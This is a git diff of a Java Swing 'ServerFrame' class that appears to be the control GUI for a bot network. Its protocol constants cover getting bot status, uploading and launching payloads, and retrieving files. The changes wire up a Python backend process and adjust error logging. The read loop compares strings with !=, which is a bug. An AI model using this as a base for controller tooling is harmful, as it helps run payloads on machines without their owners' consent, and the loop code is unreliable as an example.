@@ -45,7 +45,7 @@ import javax.swing.event.ListSelectionListener;
 
 /**
  *
- * @author Douglas
+ * @author Douglas, Mitch, Shawn
  */
 public class ServerFrame extends JFrame {
     private final BorderLayout LAYOUT;
@@ -67,14 +67,17 @@ public class ServerFrame extends JFrame {
     
     private final static boolean RIGHT_TO_LEFT = false; 
     //constants to set
-    private final static String PYTHONSCRIPT = "";
-    private final static String PYTHONPATH = "";
+    private final static String COMMAND = "C:\\Python27\\python";  //absolute path to python
+    private final static String PYTHONSCRIPT = "C:\\Users\\Douglas\\Documents\\NetBeansProjects\\servergui\\src\\servergui\\test.py";
+    //private final static String PYTHONPATH = "C:\\Users\\Douglas\\Documents\\NetBeansProjects\\servergui\\src";
     private final static String GETBOTSTATUS = "$GS$";
     private final static String UPLOADPAYLOADS = "$UP$";
     private final static String LAUNCHPAYLOADS = "$LP$";
     private final static String RETRIEVEFILES = "$RF$";
     private final static String ENDCOMMAND = "$ENDL$";
-    private final static String DELIMITER = "$";
+    private final static String INPUT_DONE = "$";
+    private final static char DELIMITER = '$';
+    
     
     private List<String> selectedValuesList;
     
@@ -111,7 +114,7 @@ public class ServerFrame extends JFrame {
                         }
                         catch(Exception exc)
                         {
-                            System.out.println(exc);
+                            System.err.println(exc);
                         }
                         finally
                         {
@@ -142,7 +145,7 @@ public class ServerFrame extends JFrame {
                         }
                         catch(Exception exc)
                         {
-                            System.out.println(exc);
+                            System.err.println(exc);
                         }
                         finally
                         {
@@ -175,7 +178,7 @@ public class ServerFrame extends JFrame {
                         }
                         catch(Exception exc)
                         {
-                            System.out.println(exc);
+                            System.err.println(exc);
                         }
                         finally
                         {
@@ -283,17 +286,20 @@ public class ServerFrame extends JFrame {
         //start the python serverprocess
         try
         {
-            pb = new ProcessBuilder(PYTHONSCRIPT);
+            pb = new ProcessBuilder(COMMAND, PYTHONSCRIPT);
             p = pb.start();
             readProc = new BufferedReader(new InputStreamReader(p.getInputStream()));
             readProcErr = new BufferedReader(new InputStreamReader(p.getErrorStream()));
             writeProc = new BufferedWriter(new OutputStreamWriter(p.getOutputStream()));
+            System.out.println("Execed Process");
+            System.out.println(readProc.readLine());
         }
         catch(Exception e)
         {
-            System.out.println("failed to exec server");
-            System.out.println(e);
-        }
+            System.err.println("failed to exec server");
+            System.err.println(e);
+            System.exit(1);
+        }   
     }//end startUp()
     
     private void updateList()
@@ -306,7 +312,7 @@ public class ServerFrame extends JFrame {
             try
             {
                 String currentLine;
-                while(DELIMITER != (currentLine = readProc.readLine()))
+                while(new String(INPUT_DONE) != (currentLine = readProc.readLine()))
                 {
                     //reformat the line
                     Updated.add(currentLine.replace(DELIMITER, ' '));
@@ -314,12 +320,13 @@ public class ServerFrame extends JFrame {
             }
             catch(Exception e)
             {
-                System.out.println(e);
+                System.err.println(e);
+                System.err.println("Failed to read from process");
             }
         }
         catch(Exception e)
         {
-            System.out.println(e);
+            System.err.println(e);
         }
         finally
         {
